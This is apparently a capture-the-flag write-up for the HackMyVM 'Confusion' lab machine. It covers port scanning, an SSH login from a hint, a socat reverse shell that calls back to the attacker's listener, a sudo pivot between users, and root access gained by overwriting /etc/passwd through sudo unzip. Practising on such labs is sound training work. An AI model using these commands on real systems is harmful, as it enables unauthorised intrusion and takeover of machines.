---
layout: post
title: "HackMyVM - Confusion"
date: 2021-10-29 00:00:00 +0100
categories: hmv
tag: ["PortForward", "RCE", "Gitea"]
---

Creator: [avijneyam](https://hackmyvm.eu/profile/?user=avijneyam)
Level: Medium
Release Date: 2021-10-27

## Scan

```bash
$ nmap -sC -sV -p- 192.168.1.233    
Starting Nmap 7.92 ( https://nmap.org ) at 2021-10-29 22:19 WEST
Nmap scan report for 192.168.1.233
Host is up (0.00035s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 04:32:4e:fc:d9:70:a0:8a:47:4d:f5:a6:86:aa:bd:5f (RSA)
|   256 70:c2:bd:7d:b9:25:6d:36:92:fd:2a:8e:64:24:bd:73 (ECDSA)
|_  256 84:28:9c:40:fe:c4:26:bf:55:61:4c:58:c5:23:77:35 (ED25519)
32145/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     Welcome To The My Magic World
|     many times you want to ping?: Traceback (most recent call last):
|     File "/opt/ping.py", line 7, in <module>
|     no_of_packets = int(input("How many times you want to ping?: "))
|     File "<string>", line 0
|     SyntaxError: unexpected EOF while parsing
|   GetRequest: 
|     Welcome To The My Magic World
|     many times you want to ping?: Traceback (most recent call last):
|     File "/opt/ping.py", line 7, in <module>
|     no_of_packets = int(input("How many times you want to ping?: "))
|     File "<string>", line 1, in <module>
|     NameError: name 'GET' is not defined
|   HTTPOptions, RTSPRequest: 
|     Welcome To The My Magic World
|     many times you want to ping?: Traceback (most recent call last):
|     File "/opt/ping.py", line 7, in <module>
|     no_of_packets = int(input("How many times you want to ping?: "))
|     File "<string>", line 1, in <module>
|     NameError: name 'OPTIONS' is not defined
|   NULL: 
|     Welcome To The My Magic World
|_    many times you want to ping?:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port32145-TCP:V=7.92%I=7%D=5/21%Time=62895759%P=x86_64-pc-linux-gnu%r(N
SF:ULL,43,"Welcome\x20To\x20The\x20My\x20Magic\x20World\r\n\r\nHow\x20many
SF:\x20times\x20you\x20want\x20to\x20ping\?:\x20")%r(GenericLines,12C,"Wel
SF:come\x20To\x20The\x20My\x20Magic\x20World\r\n\r\nHow\x20many\x20times\x
SF:20you\x20want\x20to\x20ping\?:\x20Traceback\x20\(most\x20recent\x20call
SF:\x20last\):\r\n\x20\x20File\x20\"/opt/ping\.py\",\x20line\x207,\x20in\x
SF:20<module>\r\n\x20\x20\x20\x20no_of_packets\x20=\x20int\(input\(\"How\x
SF:20many\x20times\x20you\x20want\x20to\x20ping\?:\x20\"\)\)\r\n\x20\x20Fi
SF:le\x20\"<string>\",\x20line\x200\r\n\x20\x20\x20\x20\r\n\x20\x20\x20\x2
SF:0\^\r\nSyntaxError:\x20unexpected\x20EOF\x20while\x20parsing\r\n")%r(Ge
SF:tRequest,127,"Welcome\x20To\x20The\x20My\x20Magic\x20World\r\n\r\nHow\x
SF:20many\x20times\x20you\x20want\x20to\x20ping\?:\x20Traceback\x20\(most\
SF:x20recent\x20call\x20last\):\r\n\x20\x20File\x20\"/opt/ping\.py\",\x20l
SF:ine\x207,\x20in\x20<module>\r\n\x20\x20\x20\x20no_of_packets\x20=\x20in
SF:t\(input\(\"How\x20many\x20times\x20you\x20want\x20to\x20ping\?:\x20\"\
SF:)\)\r\n\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\
SF:nNameError:\x20name\x20'GET'\x20is\x20not\x20defined\r\n")%r(HTTPOption
SF:s,12B,"Welcome\x20To\x20The\x20My\x20Magic\x20World\r\n\r\nHow\x20many\
SF:x20times\x20you\x20want\x20to\x20ping\?:\x20Traceback\x20\(most\x20rece
SF:nt\x20call\x20last\):\r\n\x20\x20File\x20\"/opt/ping\.py\",\x20line\x20
SF:7,\x20in\x20<module>\r\n\x20\x20\x20\x20no_of_packets\x20=\x20int\(inpu
SF:t\(\"How\x20many\x20times\x20you\x20want\x20to\x20ping\?:\x20\"\)\)\r\n
SF:\x20\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nNameEr
SF:ror:\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n")%r(RTSPRequest,1
SF:2B,"Welcome\x20To\x20The\x20My\x20Magic\x20World\r\n\r\nHow\x20many\x20
SF:times\x20you\x20want\x20to\x20ping\?:\x20Traceback\x20\(most\x20recent\
SF:x20call\x20last\):\r\n\x20\x20File\x20\"/opt/ping\.py\",\x20line\x207,\
SF:x20in\x20<module>\r\n\x20\x20\x20\x20no_of_packets\x20=\x20int\(input\(
SF:\"How\x20many\x20times\x20you\x20want\x20to\x20ping\?:\x20\"\)\)\r\n\x2
SF:0\x20File\x20\"<string>\",\x20line\x201,\x20in\x20<module>\r\nNameError
SF::\x20name\x20'OPTIONS'\x20is\x20not\x20defined\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 115.88 seconds
```

## SSH

```bash
$ ssh 192.168.1.233
Have you ever thought?
     If 
 Cindrella's 
   Shoe Fit 
  Perfectly 
   Then Why 
  Did It Fall 
    Off?
still:confused?
Then go for Port 32145 :)
adok@192.168.1.233's password: 
```

* Hint!?

```
still:confused?
```

```bash
$ ssh still@192.168.1.233
Have you ever thought?
     If 
 Cindrella's 
   Shoe Fit 
  Perfectly 
   Then Why 
  Did It Fall 
    Off?
still:confused?
Then go for Port 32145 :)
still@192.168.1.233's password: 
Linux confusion 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64
Last login: Sat Oct 29 17:32:38 2021 from 192.168.1.6
Welcome To My Secret Most Secure Shell :p
id
uid=0(root) gid=0(root) groups=0(root)
Connection to 192.168.1.233 closed.
```

* Shell disconnects after any command

## Port Forward with Socat + NetCat

```bash
Welcome To My Secret Most Secure Shell :p
socat TCP4:192.168.1.6:9001 exec:/bin/bash
```

```bash
$ nc -lvnp 9001                     
listening on [any] 9001 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.233] 53008
id
uid=1001(still) gid=1001(still) groups=1001(still)
pwd
/home/still
```

### Stable shell

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
2xENTER
```

## Lateral movement (still > sammy)

```bash
still@confusion:~$ sudo -l
Matching Defaults entries for still on confusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User still may run the following commands on confusion:
    (sammy) NOPASSWD: /usr/bin/python3 /opt/password.py

still@confusion:~$ sudo -u sammy /usr/bin/python3 /opt/password.py
QWJCYXJQbmFQZW5weFpsQ25mZmpiZXEK
still@confusion:~$ 
```

## CyberChef (Base64>ROT13)

<img src="https://drive.google.com/uc?id=1Rb8tkw7sP8OfUkVZsjNZQedOe_0SVzET"/>

## ROOT

```bash
sammy@confusion:~$ sudo -l
Matching Defaults entries for sammy on confusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sammy may run the following commands on confusion:
    (root) NOPASSWD: /usr/bin/unzip
```

```bash
sammy@confusion:~$ openssl passwd -1 ad0krulez
$1$22J.fOIi$Mm087fHKNTfk3Fx4oiUl4/
sammy@confusion:~$ root:$1$22J.fOIi$Mm087fHKNTfk3Fx4oiUl4/:0:0:root:/root:/bin/bash
sammy@confusion:~$ nano passwd 
sammy@confusion:~$ zip passwd ./passwd 
  adding: passwd (deflated 9%)
sammy@confusion:~$ sudo unzip passwd.zip -d /etc/
Archive:  passwd.zip
replace /etc/passwd? [y]es, [n]o, [A]ll, [N]one, [r]ename: y
  inflating: /etc/passwd             
sammy@confusion:~$ su -l
Password: 
root@confusion:~# id
uid=0(root) gid=0(root) groups=0(root)
```
